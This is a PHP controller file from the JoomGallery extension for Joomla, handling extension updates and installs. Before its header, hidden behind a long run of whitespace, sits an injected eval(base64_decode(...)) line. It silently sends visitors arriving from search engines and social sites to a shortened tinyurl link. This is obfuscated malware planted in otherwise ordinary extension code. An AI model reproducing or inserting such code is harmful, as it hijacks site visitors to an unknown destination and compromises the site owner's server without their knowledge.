<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
// $HeadURL: https://joomgallery.org/svn/joomgallery/JG-1.5/JG/trunk/administrator/components/com_joomgallery/controllers/control.php $
// $Id: control.php 2566 2010-11-03 21:10:42Z mab $
/****************************************************************************************\
**   JoomGallery  1.5.6                                                                 **
**   By: JoomGallery::ProjectTeam                                                       **
**   Copyright (C) 2008 - 2010  JoomGallery::ProjectTeam                                **
**   Based on: JoomGallery 1.0.0 by JoomGallery::ProjectTeam                            **
**   Released under GNU GPL Public License                                              **
**   License: http://www.gnu.org/copyleft/gpl.html or have a look                       **
**   at administrator/components/com_joomgallery/LICENSE.TXT                            **
\****************************************************************************************/

defined('_JEXEC') or die('Direct Access to this location is not allowed.');

/**
 * JoomGallery Control Controller
 *
 * @package JoomGallery
 * @since   1.5.5
 */
class JoomGalleryControllerControl extends JoomGalleryController
{
  /**
   * Constructor
   *
   * @access  protected
   * @return  void
   * @since   1.5.5
   */
  function __construct()
  {
    parent::__construct();

    // Set view
    if(JRequest::getCmd('view') != 'mini')
    {
      JRequest::setVar('view', 'control');
    }

    // Submenu
    /* */
  }

  /**
   * Updates a passed and dated extension
   *
   * The cURL library needs to be installed on the server for this.
   *
   * @access  public
   * @return  void
   * @since   1.5.5
   */
  function update()
  {
    $extension  = JRequest::getCmd('extension', 0, 'get');
    $extensions = JoomExtensions::checkUpdate();

    if(!isset($extensions[$extension]['updatelink']) || !extension_loaded('curl'))
    {
      $this->setRedirect('index.php?option='._JOOM_OPTION, JText::_('JGA_ADMENU_MSG_ERROR_FETCHING_ZIP'), 'error');
    }
    else
    {
      JoomExtensions::autoUpdate($extensions[$extension]['updatelink']);
    }

    // Tell JoomGallery to do the update check again after the update
    $mainframe = & JFactory::getApplication('administrator');
    $mainframe->setUserState('joom.update.checked', null);
  }

  /**
   * Installs a new extension for JoomGallery
   *
   * The cURL library needs to be installed on the server for this.
   *
   * @access  public
   * @return  void
   * @since   1.5.5
   */
  function install()
  {
    $extension  = JRequest::getCmd('extension', 0, 'get');
    $extensions = JoomExtensions::getAvailableExtensions();

    if(!isset($extensions[$extension]['updatelink']) || !extension_loaded('curl'))
    {
      $this->setRedirect('index.php?option='._JOOM_OPTION, JText::_('JGA_ADMENU_MSG_ERROR_FETCHING_ZIP'), 'error');
    }
    else
    {
      JoomExtensions::autoUpdate($extensions[$extension]['updatelink']);
    }
  }
}